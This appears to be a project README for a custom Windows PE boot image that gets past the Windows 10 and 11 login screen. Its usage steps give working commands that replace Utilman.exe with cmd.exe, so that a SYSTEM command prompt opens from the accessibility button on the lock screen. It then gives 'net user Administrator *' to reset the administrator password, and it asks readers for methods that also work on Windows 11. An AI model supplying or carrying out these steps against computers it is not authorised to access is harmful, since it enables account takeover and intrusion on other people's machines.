# Windows-10-and-11-Admin-Bypass
Windows 10 and 11 Admin Bypass Using a Custom Windows PE which directly boots to Admin CMD


Unofficial Custom Windows PE is a project created by Py0x11 that allows users to directly boot into an Administrator CMD prompt. This tool can be used on all Windows versions up to Windows 10. However, Windows 11 has extra security features that cannot be easily bypassed.

## Usage

To use Unofficial Custom Windows PE, follow these steps:

1. Boot the Py0x11_CMD.iso file.
2. for booting the iso file i recommend using ventoy [https://www.ventoy.net/]
3. Type in the following command: `ren C:\Windows\System32\Utilman.exe Utilman.old`
4. Type in the following command: `copy C:\Windows\System32\cmd.exe Utilman.exe`
5. Type in the command `exit`, and the window will close and reboot you into your main Windows boot.
6. Click on the Accessibility icon on the bottom right corner of the login screen to open the Administrator Command Prompt.

## Password Bypass

In Windows 10 and earlier versions of Windows, the password can be bypassed by typing in the following command: `net user Administrator *`

You will be prompted to enter a new password, then asked to confirm it. Once you confirm, you will have successfully changed the password for your account.

Please note that the password changing bypass only works on Windows 10 and earlier versions of Windows,
in Windows 11 you will get the CMD in your Login Page But you will not be able to get past the login page by any possible methods known to me
if you have any such methods pull a issue in this repo and let me know
